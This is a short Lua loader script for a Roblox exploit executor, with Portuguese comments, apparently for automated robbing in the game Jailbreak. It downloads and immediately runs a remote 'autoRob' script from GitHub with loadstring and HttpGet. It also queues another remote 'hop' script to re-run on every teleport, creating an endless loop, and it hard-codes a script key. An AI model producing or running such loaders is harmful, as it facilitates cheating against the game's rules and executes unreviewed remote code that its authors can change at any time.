-- Chave do script (se necessário pelo executor)
script_key = "lqEDtgthalNLvLXEbzHnWZctJAQrwWNA"

-- URL do farming script
local farmUrl = "https://raw.githubusercontent.com/BlitzIsKing/UniversalFarm/refs/heads/main/Jailbreak/autoRob"

-- Executa imediatamente o farming script
loadstring(game:HttpGet(farmUrl))()

-- Reenfileira o próprio hop para looping infinito
queue_on_teleport('script_key="lqEDtgthalNLvLXEbzHnWZctJAQrwWNA"; loadstring(game:HttpGet("https://raw.githubusercontent.com/iSaidBr/teste-qot/refs/heads/main/hop"))()')

-- Heartbeat: atualiza arquivo a cada 10 segundos
task.spawn(function()
    while true do
        pcall(function()
            writefile("manager_heartbeat.txt", tostring(os.time()))
        end)
        task.wait(10)
    end
end)
